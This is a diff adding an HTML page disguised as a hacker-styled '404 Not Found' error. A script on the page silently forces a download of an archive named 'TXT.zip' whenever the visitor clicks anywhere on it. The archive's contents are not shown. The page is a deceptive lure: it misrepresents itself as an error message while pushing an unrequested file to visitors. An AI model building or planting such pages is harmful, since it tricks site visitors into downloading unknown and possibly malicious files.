@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>404 Not Found</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Courier New', monospace;
+      background-color: #000;
+      color: #0f0;
+      background-image: linear-gradient(rgba(0, 255, 0, 0.22) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 0, 0.22) 1px, transparent 1px);
+      background-size: 28px 28px;
+      animation: i 20s linear infinite;
+      height: 100vh;
+      overflow: hidden;
+      cursor: pointer;
+    }
+    @keyframes i {
+      0% { background-position: 0 0; }
+      100% { background-position: -140px -140px; }
+    }
+    #a {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    h1 {
+      margin-bottom: 10px;
+      text-shadow: 0 0 5px #0f0;
+      font-size: 48px;
+    }
+    p {
+      margin: 5px 0;
+      max-width: 600px;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body onclick="s()">
+  <div id="a">
+    <h1>404</h1>
+    <p>ERROR: ACCESS DENIED</p>
+    <p>REQUESTED RESOURCE NOT FOUND</p>
+    <p>SYSTEM SECURITY PROTOCOL ACTIVATED</p>
+    <p>CONNECTION TERMINATED</p>
+  </div>
+  <script>
+    function s() {
+      var t = document.createElement('a');
+      t.href = 'TXT.zip';
+      t.download = 'TXT.zip';
+      document.body.appendChild(t);
+      t.click();
+      document.body.removeChild(t);
+    }
+  </script>
+</body>
+</html>
